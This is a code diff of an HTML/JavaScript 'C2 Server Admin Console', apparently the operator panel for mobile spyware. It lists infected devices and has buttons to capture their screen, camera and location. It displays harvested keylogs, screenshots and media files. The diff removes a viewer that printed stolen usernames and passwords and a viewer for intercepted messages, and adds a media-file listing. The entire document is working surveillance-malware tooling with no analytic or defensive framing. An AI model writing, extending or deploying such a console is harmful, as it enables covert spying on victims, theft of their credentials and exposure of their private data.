@@ -1,6 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
+    <meta charset="UTF-8">
     <title>C2 Server Admin Console</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <style>
@@ -47,11 +48,9 @@
         <div class="panel">
             <h2>Harvested Data</h2>
             <div class="data-types">
-                <div class="data-type" id="btn-credentials" onclick="loadData('credentials')">Credentials</div>
                 <div class="data-type" id="btn-keylog" onclick="loadData('keylog')">Keylog Data</div>
                 <div class="data-type" id="btn-location" onclick="loadData('location')">Location Data</div>
-                <div class="data-type" id="btn-messages" onclick="loadData('messages')">Messages</div>
-                <div class="data-type" id="btn-screenshots" onclick="loadData('screenshots')">Screenshots</div>
+                <div class="data-type" id="btn-screenshots" onclick="loadData('screenshots')">Screenshots/Camera</div>
                 <div class="data-type active" id="btn-all" onclick="loadData('all')">All Data</div>
             </div>
             <div id="data-viewer">Select a data type to view</div>
@@ -89,7 +88,6 @@
                                     <p>Manufacturer: ${device.device_info?.manufacturer || 'Unknown'}</p>
                                 </div>
                                 <div class="device-controls">
-                                    <button onclick="sendCommand('${device.device_id}', 'collect_info')">Collect Device Info</button>
                                     <button onclick="sendCommand('${device.device_id}', 'capture_screenshot')">Capture Screenshot</button>
                                     <button onclick="sendCommand('${device.device_id}', 'capture_camera')">Capture Camera</button>
                                     <button onclick="sendCommand('${device.device_id}', 'get_location')">Get Location</button>
@@ -335,35 +333,7 @@
                         }
                     }
                 }
-            } else if (actualType.toLowerCase().includes('credential') ||
-                       actualType.toLowerCase().includes('auth') ||
-                       actualType.toLowerCase().includes('login')) {
-                // Format credential data
-                if (itemData.username) {
-                    html += `<p><strong>Source:</strong> ${itemData.source || 'Unknown'}</p>`;
-                    html += `<p><strong>Username:</strong> ${itemData.username}</p>`;
-                    html += `<p><strong>Password:</strong> ${itemData.password || '******'}</p>`;
-                } else if (itemData.data && typeof itemData.data === 'string') {
-                    // Try to parse nested data
-                    try {
-                        const credData = JSON.parse(itemData.data);
-                        if (credData.username) {
-                            html += `<p><strong>Source:</strong> ${credData.source || 'Unknown'}</p>`;
-                            html += `<p><strong>Username:</strong> ${credData.username}</p>`;
-                            html += `<p><strong>Password:</strong> ${credData.password || '******'}</p>`;
-                        }
-                    } catch (e) {
-                        // Not JSON, treat as text
-                        if (itemData.data.includes(':')) {
-                            const parts = itemData.data.split(':', 2);
-                            html += `<p><strong>Username:</strong> ${parts[0]}</p>`;
-                            html += `<p><strong>Password:</strong> ${parts[1] || '******'}</p>`;
-                        } else {
-                            html += `<p><strong>Raw Data:</strong> ${itemData.data}</p>`;
-                        }
-                    }
-                }
-            } else if (actualType.toLowerCase().includes('keylog') ||
+            }else if (actualType.toLowerCase().includes('keylog') ||
                       actualType.toLowerCase().includes('input')) {
                 // Format keylog data
                 if (itemData.text) {
@@ -373,15 +343,38 @@
                     html += `<p><strong>Input Text:</strong></p>`;
                     html += `<pre style="white-space: pre-wrap;">${itemData.data}</pre>`;
                 }
-            } else if (actualType.toLowerCase().includes('message') ||
-                       actualType.toLowerCase().includes('sms') ||
-                       actualType.toLowerCase().includes('chat')) {
-                // Format message data
-                if (itemData.message) {
-                    html += `<p><strong>From:</strong> ${itemData.sender || 'Unknown'}</p>`;
-                    html += `<p><strong>To:</strong> ${itemData.recipient || 'Unknown'}</p>`;
-                    html += `<p><strong>Message:</strong></p>`;
-                    html += `<pre style="white-space: pre-wrap;">${itemData.message}</pre>`;
+            }    else if (actualType.toLowerCase().includes('media') ||
+                      actualType.toLowerCase().includes('file') ||
+                      actualType.toLowerCase().includes('metadata')) {
+                // Format media metadata
+                if (itemData.files) {
+                    html += `<p><strong>Media Files (${Object.keys(itemData.files).length}):</strong></p>`;
+                    html += `<ul style="list-style-type: none; padding-left: 10px;">`;
+                    for (const [fileName, filePath] of Object.entries(itemData.files)) {
+                        html += `<li>${fileName} <br><small style="color: #666">${filePath}</small></li>`;
+                    }
+                    html += `</ul>`;
+                } else if (itemData.media_files) {
+                    html += `<p><strong>Media Files (${Object.keys(itemData.media_files).length}):</strong></p>`;
+                    html += `<ul style="list-style-type: none; padding-left: 10px;">`;
+                    for (const [fileName, filePath] of Object.entries(itemData.media_files)) {
+                        html += `<li>${fileName} <br><small style="color: #666">${filePath}</small></li>`;
+                    }
+                    html += `</ul>`;
+                } else if (itemData.data && typeof itemData.data === 'string') {
+                    try {
+                        const mediaData = JSON.parse(itemData.data);
+                        if (mediaData.media_files) {
+                            html += `<p><strong>Media Files (${Object.keys(mediaData.media_files).length}):</strong></p>`;
+                            html += `<ul style="list-style-type: none; padding-left: 10px;">`;
+                            for (const [fileName, filePath] of Object.entries(mediaData.media_files)) {
+                                html += `<li> ${fileName} <br><small style="color: #666">${filePath}</small></li>`;
+                            }
+                            html += `</ul>`;
+                        }
+                    } catch (e) {
+                        // Not JSON or doesn't contain media_files
+                    }
                 }
             }
 
@@ -406,7 +399,6 @@
             return html;
         }
 
-        // Initial load
         document.addEventListener('DOMContentLoaded', function() {
             loadDevices();
             loadDeviceSelector();
